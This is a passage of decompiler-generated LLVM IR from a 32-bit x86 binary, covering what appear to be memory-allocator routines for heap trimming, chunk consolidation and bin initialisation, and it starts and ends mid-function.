  uselistorder i32 %stack_var_-40.0, { 12, 4, 0, 1, 9, 8, 7, 2, 5, 3, 6, 11, 10 }
  uselistorder i32 %v1_805345e, { 1, 0 }
  uselistorder i32 %v1_805344e, { 0, 2, 1 }
  uselistorder i32 %v0_8053437, { 1, 0 }
  uselistorder i32 %v2_805341e, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32* %stack_var_-60, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 12, 13 }
  uselistorder i32 %tmp7, { 0, 2, 1, 3 }
  uselistorder i32 %tmp6, { 15, 14, 13, 2, 12, 11, 10, 1, 9, 3, 0, 8, 7, 6, 5, 4 }
  uselistorder i32* %eax.global-to-local, { 2, 3, 1, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 40, 41, 39, 42, 43, 44, 45, 0, 46, 47, 48, 49, 50 }
  uselistorder i32 -32, { 0, 1, 5, 4, 6, 7, 8, 9, 2, 3 }
  uselistorder i32 (i32)* @function_8053939, { 10, 9, 8, 7, 0, 3, 2, 1, 6, 5, 11, 4 }
  uselistorder i32 (i32)* @function_8052b74, { 6, 5, 4, 0, 1, 3, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 2 }
  uselistorder label %dec_label_pc_80536fa, { 1, 0 }
  uselistorder label %dec_label_pc_80536f7, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80536e9, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_80536dc, { 1, 0 }
  uselistorder label %dec_label_pc_8053698, { 1, 0 }
  uselistorder label %dec_label_pc_8053685, { 1, 0 }
  uselistorder label %dec_label_pc_805360d, { 1, 0 }
  uselistorder label %dec_label_pc_80535c0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_80535ac, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_8053505, { 1, 0 }
  uselistorder label %dec_label_pc_8053465, { 1, 0 }
}

define i32 @function_8053704() local_unnamed_addr {
dec_label_pc_8053704:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %v0_805370b = load i32, i32* @edx, align 4
  store i32 %v0_805370b, i32* %ebp.global-to-local, align 4
  %v1_805370d = add i32 %v0_805370b, 860
  %v2_805370d = inttoptr i32 %v1_805370d to i32*
  %v3_805370d = load i32, i32* %v2_805370d, align 4
  store i32 %v3_805370d, i32* %ecx.global-to-local, align 4
  %v1_8053713 = add i32 %v0_805370b, 44
  %v2_8053713 = inttoptr i32 %v1_8053713 to i32*
  %v3_8053713 = load i32, i32* %v2_8053713, align 4
  %v1_8053716 = add i32 %v3_8053713, 4
  %v2_8053716 = inttoptr i32 %v1_8053716 to i32*
  %v3_8053716 = load i32, i32* %v2_8053716, align 4
  %v1_8053719 = and i32 %v3_8053716, -4
  store i32 %v1_8053719, i32* @esi, align 4
  %v1_805371e = load i32, i32* @eax, align 4
  %v2_805371e = add i32 %v3_805370d, -17
  %v2_8053720 = add i32 %v2_805371e, %v1_8053719
  %v3_8053720 = sub i32 %v2_8053720, %v1_805371e
  %div = udiv i32 %v3_8053720, %v3_805370d
  store i32 %div, i32* %eax.global-to-local, align 4
  %tmp10 = urem i32 %v3_8053720, %v3_805370d
  store i32 %tmp10, i32* @edx, align 4
  %v1_8053728 = add i32 %div, -1
  %v4_805372b = mul i32 %v1_8053728, %v3_805370d
  store i32 %v4_805372b, i32* @ebx, align 4
  %tmp11 = icmp slt i32 %v4_805372b, 1
  br i1 %tmp11, label %dec_label_pc_8053787, label %dec_label_pc_8053732

dec_label_pc_8053732:                             ; preds = %dec_label_pc_8053704
  %v1_8053737 = call i32 @function_8054869(i32 0)
  store i32 %v1_8053737, i32* %edi.global-to-local, align 4
  %v0_805373e = load i32, i32* @esi, align 4
  store i32 %v0_805373e, i32* %eax.global-to-local, align 4
  %v1_8053740 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8053740 = add i32 %v1_8053740, 44
  %v3_8053740 = inttoptr i32 %v2_8053740 to i32*
  %v4_8053740 = load i32, i32* %v3_8053740, align 4
  %v5_8053740 = add i32 %v4_8053740, %v0_805373e
  store i32 %v5_8053740, i32* %eax.global-to-local, align 4
  %v12_8053746 = icmp eq i32 %v1_8053737, %v5_8053740
  %v1_8053748 = icmp eq i1 %v12_8053746, false
  br i1 %v1_8053748, label %dec_label_pc_8053787, label %dec_label_pc_805374a

dec_label_pc_805374a:                             ; preds = %dec_label_pc_8053732
  %v1_805374d = sub i32 0, %v4_805372b
  store i32 %v1_805374d, i32* @ebx, align 4
  %v1_8053750 = call i32 @function_8054869(i32 %v1_805374d)
  store i32 %v1_8053750, i32* %eax.global-to-local, align 4
  %v1_805375c = call i32 @function_8054869(i32 0)
  store i32 %v1_805375c, i32* %eax.global-to-local, align 4
  %v10_8053764 = icmp eq i32 %v1_805375c, -1
  br i1 %v10_8053764, label %dec_label_pc_8053787, label %dec_label_pc_8053769

dec_label_pc_8053769:                             ; preds = %dec_label_pc_805374a
  %v0_8053769 = load i32, i32* %edi.global-to-local, align 4
  %v2_805376b = sub i32 %v0_8053769, %v1_805375c
  %v12_805376b = icmp eq i32 %v2_805376b, 0
  store i32 %v2_805376b, i32* %ecx.global-to-local, align 4
  br i1 %v12_805376b, label %dec_label_pc_8053787, label %dec_label_pc_805376f

dec_label_pc_805376f:                             ; preds = %dec_label_pc_8053769
  %v0_805376f = load i32, i32* %ebp.global-to-local, align 4
  %v1_805376f = add i32 %v0_805376f, 44
  %v2_805376f = inttoptr i32 %v1_805376f to i32*
  %v3_805376f = load i32, i32* %v2_805376f, align 4
  store i32 %v3_805376f, i32* %eax.global-to-local, align 4
  %v1_8053772 = add i32 %v0_805376f, 872
  %v2_8053772 = inttoptr i32 %v1_8053772 to i32*
  %v3_8053772 = load i32, i32* %v2_8053772, align 4
  %v5_8053772 = sub i32 %v3_8053772, %v2_805376b
  store i32 %v5_8053772, i32* %v2_8053772, align 4
  %v0_8053778 = load i32, i32* @esi, align 4
  %v1_8053778 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8053778 = sub i32 %v0_8053778, %v1_8053778
  %v1_805377a = or i32 %v2_8053778, 1
  %v1_805377d = load i32, i32* %eax.global-to-local, align 4
  %v2_805377d = add i32 %v1_805377d, 4
  %v3_805377d = inttoptr i32 %v2_805377d to i32*
  store i32 %v1_805377a, i32* %v3_805377d, align 4
  br label %dec_label_pc_8053789

dec_label_pc_8053787:                             ; preds = %dec_label_pc_8053769, %dec_label_pc_805374a, %dec_label_pc_8053732, %dec_label_pc_8053704
  br label %dec_label_pc_8053789

dec_label_pc_8053789:                             ; preds = %dec_label_pc_805376f, %dec_label_pc_8053787
  %storemerge = phi i32 [ 1, %dec_label_pc_805376f ], [ 0, %dec_label_pc_8053787 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_805375c, { 1, 0, 2 }
  uselistorder i32 %v4_805372b, { 1, 2, 0 }
  uselistorder i32 %v3_805370d, { 0, 3, 2, 1, 4 }
  uselistorder i32* %eax.global-to-local, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder i32 (i32)* @function_8054869, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8053789, { 1, 0 }
}

define i32 @function_8053791(i32* %arg1) local_unnamed_addr {
dec_label_pc_8053791:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp20 = ptrtoint i32* %arg1 to i32
  %v0_8053792 = load i32, i32* @edi, align 4
  %v0_8053793 = load i32, i32* @esi, align 4
  %v0_8053794 = load i32, i32* @ebx, align 4
  store i32 %tmp20, i32* %edx.global-to-local, align 4
  %v2_805379c = load i32, i32* %arg1, align 4
  store i32 %v2_805379c, i32* %eax.global-to-local, align 4
  store i32 1, i32* %edx.global-to-local, align 4
  %v1_80537a3 = icmp eq i32 %v2_805379c, 0
  br i1 %v1_80537a3, label %dec_label_pc_80538bd.lr.ph, label %dec_label_pc_80537ab

dec_label_pc_80538bd.lr.ph:                       ; preds = %dec_label_pc_8053791
  %v3_80538c1 = add i32 %tmp20, 44
  br label %dec_label_pc_80538bd

dec_label_pc_80537ab:                             ; preds = %dec_label_pc_8053791
  %v1_80537af = and i32 %v2_805379c, -3
  store i32 %v1_80537af, i32* %arg1, align 4
  %v1_80537b4 = add i32 %tmp20, 52
  store i32 %tmp20, i32* @edx, align 4
  %v1_80537bf = add i32 %tmp20, 4
  store i32 %v1_80537bf, i32* %eax.global-to-local, align 4
  %v2_80537ca = load i32, i32* %arg1, align 4
  %v2_80537d0 = udiv i32 %v2_80537ca, 8
  %v2_80537d3 = mul nuw i32 %v2_80537d0, 4
  %v3_80537d3 = add i32 %tmp20, -4
  %v4_80537d3 = add i32 %v3_80537d3, %v2_80537d3
  store i32 %v4_80537d3, i32* %eax.global-to-local, align 4
  %v2_805389a = add i32 %tmp20, 44
  %v3_805389a = inttoptr i32 %v2_805389a to i32*
  %v1_805386d = add i32 %tmp20, 60
  %v2_805386d = inttoptr i32 %v1_805386d to i32*
  br label %dec_label_pc_80537db

dec_label_pc_80537db:                             ; preds = %dec_label_pc_80538b3, %dec_label_pc_80537ab
  %v0_80537e9 = phi i32 [ %v1_80537bf, %dec_label_pc_80537ab ], [ %v4_80538b3, %dec_label_pc_80538b3 ]
  store i32 %v0_80537e9, i32* %eax.global-to-local, align 4
  %v1_80537df = inttoptr i32 %v0_80537e9 to i32*
  %v2_80537df = load i32, i32* %v1_80537df, align 4
  store i32 %v2_80537df, i32* @ecx, align 4
  %v1_80537e1 = icmp eq i32 %v2_80537df, 0
  br i1 %v1_80537e1, label %dec_label_pc_80538a9, label %dec_label_pc_80537e9

dec_label_pc_80537e9:                             ; preds = %dec_label_pc_80537db
  store i32 0, i32* %v1_80537df, align 4
  %v0_80537ef.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_80537ef

dec_label_pc_80537ef:                             ; preds = %dec_label_pc_805389d, %dec_label_pc_80537e9
  %v0_805380c = phi i32 [ %v3_80537ef, %dec_label_pc_805389d ], [ %v0_80537ef.pre, %dec_label_pc_80537e9 ]
  %v1_80537ef = add i32 %v0_805380c, 8
  %v2_80537ef = inttoptr i32 %v1_80537ef to i32*
  %v3_80537ef = load i32, i32* %v2_80537ef, align 4
  store i32 %v3_80537ef, i32* %edx.global-to-local, align 4
  %v1_80537f6 = add i32 %v0_805380c, 4
  %v2_80537f6 = inttoptr i32 %v1_80537f6 to i32*
  %v3_80537f6 = load i32, i32* %v2_80537f6, align 4
  store i32 %v3_80537f6, i32* %eax.global-to-local, align 4
  %v1_80537fb = and i32 %v3_80537f6, -2
  store i32 %v1_80537fb, i32* @edi, align 4
  %v2_80537fe = urem i32 %v3_80537f6, 2
  %v3_80537fe = icmp eq i32 %v2_80537fe, 0
  %v2_8053800 = add i32 %v1_80537fb, %v0_805380c
  store i32 %v2_8053800, i32* @ebx, align 4
  %v1_8053803 = add i32 %v2_8053800, 4
  %v2_8053803 = inttoptr i32 %v1_8053803 to i32*
  %v3_8053803 = load i32, i32* %v2_8053803, align 4
  store i32 %v3_8053803, i32* %edx.global-to-local, align 4
  %v1_805380a = icmp eq i1 %v3_80537fe, false
  br i1 %v1_805380a, label %dec_label_pc_805382c, label %dec_label_pc_805380c

dec_label_pc_805380c:                             ; preds = %dec_label_pc_80537ef
  %v1_805380c = inttoptr i32 %v0_805380c to i32*
  %v2_805380c = load i32, i32* %v1_805380c, align 4
  store i32 %v2_805380c, i32* %ebp.global-to-local, align 4
  %v2_8053810 = sub i32 %v0_805380c, %v2_805380c
  store i32 %v2_8053810, i32* %eax.global-to-local, align 4
  %v1_8053812 = add i32 %v2_8053810, 8
  %v2_8053812 = inttoptr i32 %v1_8053812 to i32*
  %v3_8053812 = load i32, i32* %v2_8053812, align 4
  store i32 %v3_8053812, i32* @esi, align 4
  %v1_8053815 = add i32 %v2_8053810, 12
  %v2_8053815 = inttoptr i32 %v1_8053815 to i32*
  %v3_8053815 = load i32, i32* %v2_8053815, align 4
  store i32 %v3_8053815, i32* %edx.global-to-local, align 4
  %v1_8053818 = add i32 %v3_8053812, 12
  %v2_8053818 = inttoptr i32 %v1_8053818 to i32*
  %v3_8053818 = load i32, i32* %v2_8053818, align 4
  store i32 %v3_8053818, i32* @ecx, align 4
  %v12_805381b = icmp eq i32 %v3_8053818, %v2_8053810
  %v1_805381d = icmp eq i1 %v12_805381b, false
  br i1 %v1_805381d, label %dec_label_pc_805385c, label %dec_label_pc_805381f

dec_label_pc_805381f:                             ; preds = %dec_label_pc_805380c
  %v1_805381f = add i32 %v3_8053815, 8
  %v2_805381f = inttoptr i32 %v1_805381f to i32*
  %v3_805381f = load i32, i32* %v2_805381f, align 4
  %v15_805381f = icmp eq i32 %v3_805381f, %v3_8053818
  %v1_8053822 = icmp eq i1 %v15_805381f, false
  br i1 %v1_8053822, label %dec_label_pc_805385c, label %dec_label_pc_8053824

dec_label_pc_8053824:                             ; preds = %dec_label_pc_805381f
  %v2_8053824 = add i32 %v2_805380c, %v1_80537fb
  store i32 %v2_8053824, i32* @edi, align 4
  store i32 %v3_8053815, i32* %v2_8053818, align 4
  %v0_8053829 = load i32, i32* @esi, align 4
  %v1_8053829 = load i32, i32* %edx.global-to-local, align 4
  %v2_8053829 = add i32 %v1_8053829, 8
  %v3_8053829 = inttoptr i32 %v2_8053829 to i32*
  store i32 %v0_8053829, i32* %v3_8053829, align 4
  %v0_8053837.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_805382c

dec_label_pc_805382c:                             ; preds = %dec_label_pc_80537ef, %dec_label_pc_8053824
  %v1_8053840 = phi i32 [ %v2_8053800, %dec_label_pc_80537ef ], [ %v0_8053837.pre, %dec_label_pc_8053824 ]
  store i32 %tmp20, i32* %eax.global-to-local, align 4
  %v1_8053834 = and i32 %v3_8053803, -4
  store i32 %v1_8053834, i32* %ebp.global-to-local, align 4
  %v4_8053837 = load i32, i32* %v3_805389a, align 4
  %v15_8053837 = icmp eq i32 %v1_8053840, %v4_8053837
  br i1 %v15_8053837, label %dec_label_pc_805388d, label %dec_label_pc_805383c

dec_label_pc_805383c:                             ; preds = %dec_label_pc_805382c
  %v2_805383c = add i32 %v1_8053840, 4
  %v3_805383c = add i32 %v2_805383c, %v1_8053834
  %v4_805383c = inttoptr i32 %v3_805383c to i32*
  %v5_805383c = load i32, i32* %v4_805383c, align 4
  store i32 %v5_805383c, i32* %eax.global-to-local, align 4
  %v3_8053840 = inttoptr i32 %v2_805383c to i32*
  store i32 %v1_8053834, i32* %v3_8053840, align 4
  %v0_8053843 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053843 = urem i32 %v0_8053843, 2
  %v2_8053843 = icmp eq i32 %v1_8053843, 0
  store i32 %v1_8053843, i32* %eax.global-to-local, align 4
  %v1_8053848 = icmp eq i1 %v2_8053843, false
  br i1 %v1_8053848, label %dec_label_pc_8053869, label %dec_label_pc_805384a

dec_label_pc_805384a:                             ; preds = %dec_label_pc_805383c
  %v0_805384a = load i32, i32* @ebx, align 4
  %v1_805384a = add i32 %v0_805384a, 8
  %v2_805384a = inttoptr i32 %v1_805384a to i32*
  %v3_805384a = load i32, i32* %v2_805384a, align 4
  store i32 %v3_805384a, i32* @edx, align 4
  %v1_805384d = add i32 %v0_805384a, 12
  %v2_805384d = inttoptr i32 %v1_805384d to i32*
  %v3_805384d = load i32, i32* %v2_805384d, align 4
  store i32 %v3_805384d, i32* %eax.global-to-local, align 4
  %v1_8053850 = add i32 %v3_805384a, 12
  %v2_8053850 = inttoptr i32 %v1_8053850 to i32*
  %v3_8053850 = load i32, i32* %v2_8053850, align 4
  store i32 %v3_8053850, i32* @esi, align 4
  %v12_8053853 = icmp eq i32 %v3_8053850, %v0_805384a
  %v1_8053855 = icmp eq i1 %v12_8053853, false
  br i1 %v1_8053855, label %dec_label_pc_805385c, label %dec_label_pc_8053857

dec_label_pc_8053857:                             ; preds = %dec_label_pc_805384a
  %v1_8053857 = add i32 %v3_805384d, 8
  %v2_8053857 = inttoptr i32 %v1_8053857 to i32*
  %v3_8053857 = load i32, i32* %v2_8053857, align 4
  %v15_8053857 = icmp eq i32 %v3_8053857, %v3_8053850
  br i1 %v15_8053857, label %dec_label_pc_8053861, label %dec_label_pc_805385c

dec_label_pc_805385c:                             ; preds = %dec_label_pc_8053857, %dec_label_pc_805384a, %dec_label_pc_805381f, %dec_label_pc_805380c
  %v0_805385c = call i32 @function_8053ad5()
  store i32 %v0_805385c, i32* %eax.global-to-local, align 4
  %v1_8053863.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8053861

dec_label_pc_8053861:                             ; preds = %dec_label_pc_8053857, %dec_label_pc_805385c
  %v1_8053863 = phi i32 [ %v3_805384a, %dec_label_pc_8053857 ], [ %v1_8053863.pre, %dec_label_pc_805385c ]
  %v0_8053863 = phi i32 [ %v3_805384d, %dec_label_pc_8053857 ], [ %v0_805385c, %dec_label_pc_805385c ]
  %v0_8053861 = load i32, i32* @edi, align 4
  %v1_8053861 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8053861 = add i32 %v1_8053861, %v0_8053861
  store i32 %v2_8053861, i32* @edi, align 4
  %v2_8053863 = add i32 %v1_8053863, 12
  %v3_8053863 = inttoptr i32 %v2_8053863 to i32*
  store i32 %v0_8053863, i32* %v3_8053863, align 4
  %v0_8053866 = load i32, i32* @edx, align 4
  %v1_8053866 = load i32, i32* %eax.global-to-local, align 4
  %v2_8053866 = add i32 %v1_8053866, 8
  %v3_8053866 = inttoptr i32 %v2_8053866 to i32*
  store i32 %v0_8053866, i32* %v3_8053866, align 4
  br label %dec_label_pc_8053869

dec_label_pc_8053869:                             ; preds = %dec_label_pc_805383c, %dec_label_pc_8053861
  store i32 %v1_80537b4, i32* %eax.global-to-local, align 4
  %v3_805386d = load i32, i32* %v2_805386d, align 4
  store i32 %v3_805386d, i32* @edx, align 4
  %v0_8053870 = load i32, i32* @ecx, align 4
  store i32 %v0_8053870, i32* %v2_805386d, align 4
  %v0_8053873 = load i32, i32* @edi, align 4
  %v1_8053875 = or i32 %v0_8053873, 1
  store i32 %v1_8053875, i32* %eax.global-to-local, align 4
  %v0_8053878 = load i32, i32* @ecx, align 4
  %v1_8053878 = load i32, i32* @edx, align 4
  %v2_8053878 = add i32 %v1_8053878, 12
  %v3_8053878 = inttoptr i32 %v2_8053878 to i32*
  store i32 %v0_8053878, i32* %v3_8053878, align 4
  %v0_805387b = load i32, i32* %eax.global-to-local, align 4
  %v1_805387b = load i32, i32* @ecx, align 4
  %v2_805387b = add i32 %v1_805387b, 4
  %v3_805387b = inttoptr i32 %v2_805387b to i32*
  store i32 %v0_805387b, i32* %v3_805387b, align 4
  store i32 %v1_80537b4, i32* %eax.global-to-local, align 4
  %v0_8053882 = load i32, i32* @edx, align 4
  %v1_8053882 = load i32, i32* @ecx, align 4
  %v2_8053882 = add i32 %v1_8053882, 8
  %v3_8053882 = inttoptr i32 %v2_8053882 to i32*
  store i32 %v0_8053882, i32* %v3_8053882, align 4
  %v0_8053885 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053885 = load i32, i32* @ecx, align 4
  %v2_8053885 = add i32 %v1_8053885, 12
  %v3_8053885 = inttoptr i32 %v2_8053885 to i32*
  store i32 %v0_8053885, i32* %v3_8053885, align 4
  %v0_8053888 = load i32, i32* @edi, align 4
  %v1_8053888 = load i32, i32* @ecx, align 4
  %v3_8053888 = add i32 %v1_8053888, %v0_8053888
  %v4_8053888 = inttoptr i32 %v3_8053888 to i32*
  store i32 %v0_8053888, i32* %v4_8053888, align 4
  br label %dec_label_pc_805389d

dec_label_pc_805388d:                             ; preds = %dec_label_pc_805382c
  %v0_805388d = load i32, i32* @edi, align 4
  %v2_805388d = add i32 %v0_805388d, %v1_8053834
  %v1_8053890 = or i32 %v2_805388d, 1
  store i32 %v1_8053890, i32* %eax.global-to-local, align 4
  %v1_8053893 = load i32, i32* @ecx, align 4
  %v2_8053893 = add i32 %v1_8053893, 4
  %v3_8053893 = inttoptr i32 %v2_8053893 to i32*
  store i32 %v1_8053890, i32* %v3_8053893, align 4
  store i32 %tmp20, i32* @edx, align 4
  %v0_805389a = load i32, i32* @ecx, align 4
  store i32 %v0_805389a, i32* %v3_805389a, align 4
  br label %dec_label_pc_805389d

dec_label_pc_805389d:                             ; preds = %dec_label_pc_8053869, %dec_label_pc_805388d
  store i32 %v3_80537ef, i32* @ecx, align 4
  %v1_80538a1 = icmp eq i32 %v3_80537ef, 0
  %v1_80538a3 = icmp eq i1 %v1_80538a1, false
  br i1 %v1_80538a3, label %dec_label_pc_80537ef, label %dec_label_pc_80538a9

dec_label_pc_80538a9:                             ; preds = %dec_label_pc_805389d, %dec_label_pc_80537db
  %v15_80538ad = icmp eq i32 %v0_80537e9, %v4_80537d3
  br i1 %v15_80538ad, label %dec_label_pc_8053931, label %dec_label_pc_80538b3

dec_label_pc_80538b3:                             ; preds = %dec_label_pc_80538a9
  %v4_80538b3 = add i32 %v0_80537e9, 4
  br label %dec_label_pc_80537db

dec_label_pc_80538bd:                             ; preds = %dec_label_pc_80538bd.lr.ph, %dec_label_pc_80538bd
  %v1_80538c1 = phi i32 [ 1, %dec_label_pc_80538bd.lr.ph ], [ %v0_80538cc, %dec_label_pc_80538bd ]
  %v2_80538c1 = mul i32 %v1_80538c1, 8
  %v4_80538c1 = add i32 %v3_80538c1, %v2_80538c1
  store i32 %v4_80538c1, i32* %eax.global-to-local, align 4
  %v1_80538c5 = add i32 %v1_80538c1, 1
  store i32 %v1_80538c5, i32* %edx.global-to-local, align 4
  %v2_80538c6 = add i32 %v4_80538c1, 12
  %v3_80538c6 = inttoptr i32 %v2_80538c6 to i32*
  store i32 %v4_80538c1, i32* %v3_80538c6, align 4
  %v0_80538c9 = load i32, i32* %eax.global-to-local, align 4
  %v2_80538c9 = add i32 %v0_80538c9, 8
  %v3_80538c9 = inttoptr i32 %v2_80538c9 to i32*
  store i32 %v0_80538c9, i32* %v3_80538c9, align 4
  %v0_80538cc = load i32, i32* %edx.global-to-local, align 4
  %v7_80538cf = icmp sgt i32 %v0_80538cc, 95
  br i1 %v7_80538cf, label %dec_label_pc_80538d1, label %dec_label_pc_80538bd

dec_label_pc_80538d1:                             ; preds = %dec_label_pc_80538bd
  store i32 %tmp20, i32* %eax.global-to-local, align 4
  %v1_80538d5 = add i32 %tmp20, 864
  %v2_80538d5 = inttoptr i32 %v1_80538d5 to i32*
  %v3_80538d5 = load i32, i32* %v2_80538d5, align 4
  %v4_80538d5 = or i32 %v3_80538d5, 1
  store i32 %v4_80538d5, i32* %v2_80538d5, align 4
  %v0_80538dc = load i32, i32* %eax.global-to-local, align 4
  %v1_80538dc = add i32 %v0_80538dc, 840
  %v2_80538dc = inttoptr i32 %v1_80538dc to i32*
  store i32 0, i32* %v2_80538dc, align 4
  %v0_80538e6 = load i32, i32* %eax.global-to-local, align 4
  %v1_80538e6 = add i32 %v0_80538e6, 852
  %v2_80538e6 = inttoptr i32 %v1_80538e6 to i32*
  store i32 65536, i32* %v2_80538e6, align 4
  %v0_80538f0 = load i32, i32* %eax.global-to-local, align 4
  %v1_80538f0 = add i32 %v0_80538f0, 844
  %v2_80538f0 = inttoptr i32 %v1_80538f0 to i32*
  store i32 262144, i32* %v2_80538f0, align 4
  %v0_80538fa = load i32, i32* %eax.global-to-local, align 4
  %v1_80538fa = add i32 %v0_80538fa, 836
  %v2_80538fa = inttoptr i32 %v1_80538fa to i32*
  store i32 262144, i32* %v2_80538fa, align 4
  store i32 %tmp20, i32* @edx, align 4
  %v2_805390b = load i32, i32* %arg1, align 4
  %v1_805390d = urem i32 %v2_805390b, 4
  %v1_8053910 = or i32 %v1_805390d, 72
  store i32 %v1_8053910, i32* %arg1, align 4
  %v0_8053915 = load i32, i32* @edx, align 4
  %v1_8053917 = add i32 %v0_8053915, 52
  store i32 %v1_8053917, i32* %eax.global-to-local, align 4
  %v2_805391a = add i32 %v0_8053915, 44
  %v3_805391a = inttoptr i32 %v2_805391a to i32*
  store i32 %v1_8053917, i32* %v3_805391a, align 4
  %v1_805391f = call i32 @function_8053f19(i32 30)
  store i32 %v1_805391f, i32* %eax.global-to-local, align 4
  %v2_805392b = add i32 %tmp20, 860
  %v3_805392b = inttoptr i32 %v2_805392b to i32*
  store i32 %v1_805391f, i32* %v3_805392b, align 4
  br label %dec_label_pc_8053931

dec_label_pc_8053931:                             ; preds = %dec_label_pc_80538a9, %dec_label_pc_80538d1
  store i32 %v0_8053794, i32* @ebx, align 4
  store i32 %v0_8053793, i32* @esi, align 4
  store i32 %v0_8053792, i32* @edi, align 4
  %v0_8053938 = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_8053938

; uselistorder directives
  uselistorder i32 %v0_80538cc, { 1, 0 }
  uselistorder i32 %v0_80538c9, { 1, 0 }
  uselistorder i32 %v1_80538c1, { 1, 0 }
  uselistorder i32 %v0_8053888, { 1, 0 }
  uselistorder i32 %v1_8053843, { 1, 0 }
  uselistorder i32 %v2_805383c, { 1, 0 }
  uselistorder i32 %v1_8053834, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8053840, { 1, 0 }
  uselistorder i32 %v3_80537ef, { 2, 1, 3, 0 }
  uselistorder i32 %v0_805380c, { 2, 1, 0, 4, 3 }
  uselistorder i32 %v0_80537e9, { 1, 0, 3, 2 }
  uselistorder i32* %v3_805389a, { 1, 0 }
  uselistorder i32 %v1_80537b4, { 1, 0 }
  uselistorder i32 %tmp20, { 3, 13, 11, 10, 8, 7, 1, 9, 2, 6, 5, 0, 12, 4 }
  uselistorder i32* %ebp.global-to-local, { 1, 0, 2 }
  uselistorder i32* %eax.global-to-local, { 24, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 17, 18, 15, 16, 19, 20, 21, 22, 23, 25, 26, 27, 28 }
  uselistorder i32 860, { 1, 0 }
  uselistorder i32 -3, { 1, 0 }
  uselistorder label %dec_label_pc_8053931, { 1, 0 }
  uselistorder label %dec_label_pc_80538bd, { 1, 0 }
  uselistorder label %dec_label_pc_805389d, { 1, 0 }
  uselistorder label %dec_label_pc_8053869, { 1, 0 }
  uselistorder label %dec_label_pc_8053861, { 1, 0 }
  uselistorder label %dec_label_pc_805382c, { 1, 0 }
}

define i32 @function_8053939(i32 %arg1) local_unnamed_addr {
dec_label_pc_8053939:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_8053939 = load i32, i32* @ebp, align 4
  %v0_805393a = load i32, i32* @edi, align 4
  %v0_805393b = load i32, i32* @esi, align 4
  %v0_805393c = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @edi, align 4
  %v1_8053944 = icmp eq i32 %arg1, 0
  br i1 %v1_8053944, label %dec_label_pc_8053acd, label %dec_label_pc_805394c

dec_label_pc_805394c:                             ; preds = %dec_label_pc_8053939
  %v2_8053957 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8053957, i32* @eax, align 4
  %v2_805395c = call i32 @function_80540a0(i32 %v2_8053957, i32 134561949)
  store i32 %v2_805395c, i32* %eax.global-to-local, align 4
  %v1_8053968 = call i32 @function_805409d(i32 ptrtoint (i32* @global_var_8056800.206 to i32))
  %v1_805396d = add i32 %arg1, -8
  store i32 %v1_805396d, i32* @ecx, align 4
  %v0_8053970 = load i8, i8* @global_var_8056ba0.207, align 1
  %v1_8053970 = sext i8 %v0_8053970 to i32
  store i32 %v1_8053970, i32* %eax.global-to-local, align 4
  %v1_8053978 = add i32 %arg1, -4
  %v2_8053978 = inttoptr i32 %v1_8053978 to i32*
  %v3_8053978 = load i32, i32* %v2_8053978, align 4
  %v1_805397d = and i32 %v3_8053978, -4
  %v4_805397d = trunc i32 %v1_805397d to i8
  store i32 %v1_805397d, i32* @ebx, align 4
  %v8_8053982 = icmp ugt i8 %v4_805397d, %v0_8053970
  br i1 %v8_8053982, label %dec_label_pc_80539a4, label %dec_label_pc_8053984

dec_label_pc_8053984:                             ; preds = %dec_label_pc_805394c
  %v2_8053984 = udiv i32 %v3_8053978, 8
  %v1_8053987 = or i32 %v1_8053970, 3
  %v3_8053987 = trunc i32 %v1_8053987 to i8
  store i32 %v1_8053987, i32* %eax.global-to-local, align 4
  store i8 %v3_8053987, i8* @global_var_8056ba0.207, align 32
  %v1_805398f = mul nuw i32 %v2_8053984, 4
  %v2_805398f = add i32 %v1_805398f, ptrtoint (i8* @global_var_8056ba0.207 to i32)
  store i32 %v2_805398f, i32* @edx, align 4
  %v1_8053996 = add i32 %v1_805398f, add (i32 ptrtoint (i8* @global_var_8056ba0.207 to i32), i32 -4)
  %v2_8053996 = inttoptr i32 %v1_8053996 to i32*
  %v3_8053996 = load i32, i32* %v2_8053996, align 4
  store i32 %v3_8053996, i32* %eax.global-to-local, align 4
  %v3_8053999 = inttoptr i32 %arg1 to i32*
  store i32 %v3_8053996, i32* %v3_8053999, align 4
  %v0_805399c = load i32, i32* @ecx, align 4
  %v1_805399c = load i32, i32* @edx, align 4
  %v2_805399c = add i32 %v1_805399c, -4
